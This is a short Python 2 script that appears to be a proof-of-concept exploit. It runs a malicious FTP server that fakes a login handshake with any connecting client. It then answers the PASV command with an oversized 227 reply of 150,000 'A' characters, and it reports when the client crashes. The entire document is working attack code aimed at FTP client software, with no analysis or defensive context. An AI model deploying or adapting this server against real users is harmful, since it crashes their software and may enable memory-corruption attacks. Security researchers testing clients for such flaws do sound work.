#!/usr/bin/python
 
from socket import *
 
host = "0.0.0.0"
port = 21
payload = "A" * 150000
 
s = socket(AF_INET, SOCK_STREAM)
s.bind((host, 21))
s.listen(1)
 
print "[+] Evil FTP Server started"
print "[+] Listening on port %d..." % port
 
conn, addr = s.accept()
print "[+] Connection accepted from %s" % addr[0]
conn.send("220 Welcome to Evil FTP Server\r\n")
conn.recv(1024)  # Receive USER
conn.send("331 Need password for whatever user\r\n")
conn.recv(1024)  # Receive PASS
conn.send("230 User logged in\r\n")
conn.recv(1024)  # Receive SYST
conn.send("215 UNIX Type: L8\r\n")
conn.recv(1024)  # Receive PWD
conn.send("257 \"/\" is current directory\r\n")
 
try:
  print "[+] Sending evil response for 'PASV' command..."
  conn.recv(1024)  # Receive PASV
  conn.send("227 "+payload+"\r\n")
  conn.recv(1024)
except error as e:
  if e.errno == 10054:
    print "[+] Client crashed!"
  else:
    print e
finally:
  conn.close()
  s.close()
